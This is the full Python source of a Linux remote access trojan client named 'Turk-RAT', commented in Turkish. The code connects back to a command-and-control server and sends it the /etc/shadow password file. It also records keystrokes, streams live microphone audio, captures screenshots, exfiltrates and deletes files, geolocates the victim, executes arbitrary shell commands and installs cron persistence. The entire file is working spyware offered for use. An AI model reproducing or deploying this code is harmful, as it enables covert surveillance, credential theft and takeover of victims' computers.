#!/usr/bin/env python3
"""
Turk-RAT Client - Linux Hedef
Yazar: [SENİN ADIN]
GitHub: github.com/kullanicin/Turk-RAT
"""
import socket
import os
import sys
import time
import subprocess
import platform
import json
import threading
import pyaudio
import psutil
import requests
from pynput import keyboard
from datetime import datetime

# ============== AYARLAR ==============
HOST = "127.0.0.1"  # C2 IP'si
PORT = 4443

CHUNK = 1024
FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100

LOG_FILE = "client.log"
# =====================================

def log(msg):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] {msg}")
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] {msg}\n")

def set_keepalive(sock):
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    if hasattr(socket, 'TCP_KEEPIDLE'):
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 30)
    if hasattr(socket, 'TCP_KEEPINTVL'):
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)
    if hasattr(socket, 'TCP_KEEPCNT'):
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 5)

def is_admin():
    try: return os.getuid() == 0
    except: return False

def konum_bilgisi_al():
    try:
        r = requests.get("http://ip-api.com/json/?fields=country,city,lat,lon", timeout=10)
        d = r.json()
        return {"Ülke": d.get("country"), "Şehir": d.get("city"), "Enlem": d.get("lat"), "Boylam": d.get("lon")}
    except: return {"Hata": "Konum alınamadı"}

def get_system_info():
    try:
        hostname = socket.gethostname()
        return json.dumps({
            "OS": platform.platform(),
            "User": os.getlogin(),
            "Hostname": hostname,
            "Local_IP": socket.gethostbyname(hostname),
            "CPU": f"{psutil.cpu_percent(1)}%",
            "RAM": f"{psutil.virtual_memory().percent}%",
            "Disk": f"{psutil.disk_usage('/').percent}%",
            "Admin": "Evet" if is_admin() else "Hayır"
        }, ensure_ascii=False, indent=2)
    except Exception as e: return f"Hata: {e}"

def keylogger(duration_seconds, conn):
    log_list = []
    def on_press(key):
        try: log_list.append(key.char)
        except AttributeError:
            if key == keyboard.Key.space: log_list.append(" ")
            elif key == keyboard.Key.enter: log_list.append("\n")
            elif key == keyboard.Key.tab: log_list.append("\t")
            else: log_list.append(f"[{key.name}]")
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    log(f"Keylogger {duration_seconds}s başladı...")
    time.sleep(duration_seconds)
    listener.stop()
    log("Keylogger bitti.")
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    fname = f"{timestamp}_keylog.txt"
    with open(fname, "w", encoding="utf-8") as f:
        f.write("".join(log_list))
    def send_keylog():
        try:
            conn.send(f"__KEYLOG_START__{fname}\n".encode())
            with open(fname, "rb") as f:
                while chunk := f.read(16384):
                    conn.send(chunk)
            conn.send(b"__KEYLOG_BITTI__\n")
            log(f"{fname} gönderildi.")
        except Exception as e: log(f"Keylog hatası: {e}")
    threading.Thread(target=send_keylog, daemon=True).start()

def mic_live(conn, stop_event):
    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
    log("Canlı ses başladı...")
    conn.send(b"__MIC_LIVE__\n")
    try:
        while not stop_event.is_set():
            data = stream.read(CHUNK, exception_on_overflow=False)
            conn.send(data)
    except: pass
    finally:
        stream.stop_stream()
        stream.close()
        p.terminate()
        conn.send(b"__MIC_BITTI__\n")
        log("Canlı ses durdu.")

def main():
    dizin = os.getcwd()
    shadow_sent = False
    mic_stop_event = threading.Event()

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(60)
            set_keepalive(s)
            s.connect((HOST, PORT))
            log("Bağlanıldı.")

            if not shadow_sent:
                s.send(b"SHADOW_SORU\n")
                cevap = s.recv(1024).decode(errors="ignore").strip()
                if cevap == "EVET":
                    try:
                        with open("/etc/shadow", "rb") as f:
                            data = f.read()
                        s.sendall(data + b"\n__SHADOW_BITTI__\n")
                        log("Shadow gönderildi.")
                    except Exception as e:
                        s.send(f"Shadow hatası: {e}\n".encode())
                shadow_sent = True

            s.send(f"__INFO__{get_system_info()}\n".encode())

            # DÜZELTME: ping_loop_loop → ping_loop
            def ping_loop():
                while True:
                    try:
                        msg = s.recv(1024).decode(errors="ignore").strip()
                        if msg == "PING":
                            s.send(b"PONG\n")
                    except: break
                    time.sleep(0.5)
            threading.Thread(target=ping_loop, daemon=True).start()

            while True:
                try:
                    data = s.recv(4096).decode("utf-8", errors="ignore").strip()
                    if not data: raise ConnectionError
                    cmd = data.lower().strip()

                    if cmd.startswith("keylogger "):
                        arg = data.split(" ", 1)[1]
                        if arg.endswith("s"): sec = int(arg[:-1])
                        elif arg.endswith("dk"): sec = int(arg[:-2]) * 60
                        else:
                            s.send(b"30s veya 30dk yaz!\n")
                            continue
                        threading.Thread(target=keylogger, args=(sec, s), daemon=True).start()
                        continue

                    elif cmd == "mic live":
                        mic_stop_event.clear()
                        threading.Thread(target=mic_live, args=(s, mic_stop_event), daemon=True).start()
                        continue

                    elif cmd == "mic_stop":
                        mic_stop_event.set()
                        continue

                    elif cmd == "persist":
                        script = os.path.abspath(__file__)
                        cron = f"@reboot python3 {script} > /dev/null 2>&1\n"
                        try:
                            subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron}") | crontab -', shell=True, check=True)
                            response = "Persistans eklendi (cron @reboot)"
                        except: response = "Persistans hatası"
                        s.send(response.encode() + b"\n")
                        continue

                    elif cmd.startswith("shell "):
                        try:
                            output = subprocess.getoutput(data[6:])
                            s.send(output.encode() + b"\n")
                            continue
                        except: pass

                    response = ""
                    if cmd == "help":
                        response = ("kapat (bağlantıyı kapatır)"
                                    "| pwd(hangi dizinde olduğunu gösterir) | "
                                    "ls(bulunduğun konumdaki dosyaları gösterir) | "
                                    "cat file(seçtiğin dosyasının içindekini okur) | "
                                    "rm file(istediğin dosyayı siler) | "
                                    "touch file\nscreenshot file.png(ekran görüntüsü alır) |"
                                    " dosya_indir file(istediğin dosyayı indirir) |"
                                    " konum(konumunu bulur) | "
                                    "info_ver_oç(sistem bileşenlerini bulur) | mic live(canlı şekilde mikrofonunu dinler) | keylogger 30s(30 saniye klavyesini dinler ve txt dosyasına yazar) | persist(arka kapı) | shell whoami(username)")
                    elif cmd == "kapat":
                        response = "Görüşürüz..."
                        s.send(response.encode() + b"\n")
                        break
                    elif cmd.startswith("cd "):
                        try:
                            os.chdir(data.split(" ", 1)[1])
                            dizin = os.getcwd()
                            response = dizin
                        except Exception as e: response = str(e)
                    elif cmd == "pwd": response = dizin
                    elif cmd == "ls": response = "\n".join(os.listdir(dizin))
                    elif cmd.startswith("cat "):
                        try: response = open(data.split(" ", 1)[1], "r").read()
                        except Exception as e: response = str(e)
                    elif cmd.startswith("rm "):
                        try:
                            os.remove(data.split(" ", 1)[1])
                            response = "Silindi"
                        except Exception as e: response = str(e)
                    elif cmd.startswith("touch "):
                        try:
                            open(data.split(" ", 1)[1], "a").close()
                            response = "Oluşturuldu"
                        except Exception as e: response = str(e)
                    elif cmd.startswith("screenshot "):
                        try:
                            import pyautogui
                            f = data.split(" ", 1)[1]
                            pyautogui.screenshot().save(f)
                            with open(f, "rb") as file:
                                while chunk := file.read(16384):
                                    s.send(chunk)
                            s.send(b"__DOSYA_BITTI__\n")
                            continue
                        except Exception as e: response = str(e)
                    elif cmd.startswith("download "):
                        try:
                            f = data.split(" ", 1)[1]
                            with open(f, "rb") as file:
                                while chunk := file.read(16384):
                                    s.send(chunk)
                            s.send(b"__DOSYA_BITTI__\n")
                            continue
                        except Exception as e: response = str(e)
                    elif cmd == "konum":
                        response = json.dumps(konum_bilgisi_al(), ensure_ascii=False)
                    elif cmd == "info_ver_oç":
                        response = get_system_info()
                    else:
                        response = "geçersiz komut"

                    s.send(response.encode() + b"\n")

                except socket.timeout:
                    continue
                except (ConnectionResetError, BrokenPipeError):
                    log("Bağlantı koptu.")
                    break
                except Exception as e:
                    log(f"Hata: {e}")
                    break

        except Exception as e:
            log(f"Bağlantı hatası: {e}")
        if 's' in locals():
            try: s.close()
            except: pass
        time.sleep(5)
        log("Yeniden bağlanılıyor...")

if __name__ == "__main__":
    main()